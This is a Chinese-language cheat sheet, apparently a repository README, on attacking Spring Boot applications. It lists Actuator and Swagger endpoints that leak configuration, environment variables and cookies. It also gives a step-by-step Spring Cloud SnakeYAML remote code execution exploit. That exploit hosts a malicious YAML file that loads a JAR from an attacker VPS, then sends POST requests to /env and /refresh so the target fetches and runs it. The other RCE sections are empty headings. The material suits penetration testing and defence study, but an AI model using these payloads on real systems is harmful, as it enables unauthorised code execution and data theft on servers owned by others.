## SpringBoot 漏洞利用及技巧

SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist



### 零：路由知识

- Spring 1.x 的路由通常以根目录 `/` 开始，2.x 统一以 `/actuator` 作为根路径
- 有些程序员会自定义 `/manage`、`/management` 或 **项目相关名称** 为根路径
- 默认端点名字，如 `/env` 有时候也会被程序员修改，如修改成 `/appenv`



### 一：信息泄露

#### 0x01：路由地址及接口调用详情泄漏

开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记环境切换，导致此漏洞；

直接访问以下几个路由，验证漏洞是否存在：

```
/api-docs
/v2/api-docs
/swagger-ui.html
```

一些可能会遇到的接口路由变形：

```
/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```



除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：

```
/mappings
/actuator/mappings
/metrics
/actuator/metrics
/actuator/beans
/actuator/configprops
```



**一般来讲，知道 springboot 应用的相关接口和传参信息并不能算是漏洞**；但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。



#### 0x02：配置不当暴露的接口其他接口

参考 [production-ready-endpoints](https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints) ，可能因为配置不当而暴露的路由主要有：

```
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
```



其中对寻找漏洞比较重要接口的有：

- /env

  GET 请求会泄露环境变量信息，或者配置中的一些用户名（偶尔会泄露密码明文）；

  同时有一定概率可以通过 POST 请求 `/env` 接口设置一些属性，触发相关 RCE 漏洞。

- /jolokia

  通过 `/jolokia/list` 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；

- /trace

  一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息



#### 0x03：获取星号填充的密码明文





### 二：远程代码执行

> 由于 springboot 很多漏洞是多方面的组件原因导致的，所以有些漏洞名字起的不太正规，能区分即可。



#### 0x01：SpEL RCE



#### 0x02：spring cloud SnakeYAML RCE

**利用条件：**

- 目标使用了 spring-cloud 相关组件
- 可以请求攻击者的 HTTP 服务器拉取文件（请求可出外网）



**利用方法：**

**步骤一：** 托管 yml 和 jar 文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在网站根目录下放置后缀为 `yml` 的文件  `example.yml`，内容如下：

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://your-vps-ip/example.jar"]
  ]]
]
```



在网站根目录下放置后缀为 `jar` 的文件  `example.jar`，内容是要执行的代码，代码编写及编译方式参考 [yaml-payload](https://github.com/artsploit/yaml-payload)。



**步骤二：** 设置 spring.cloud.bootstrap.location 属性

spring 1.x

```
POST /env HTTP/1.1
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
```

spring 2.x

```
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
```



**步骤三：** 配置更新

spring 1.x

```
POST /refresh HTTP/1.1
Content-Type: application/x-www-form-urlencoded


```

spring 2.x

```
POST /actuator/refresh HTTP/1.1
Content-Type: application/json


```



#### 0x03：xstream deserialization RCE



#### 0x04：reload logback.xml JNDI RCE



#### 0x05：h2 database query RCE



#### 0x06：jdbc url deserialization RCE




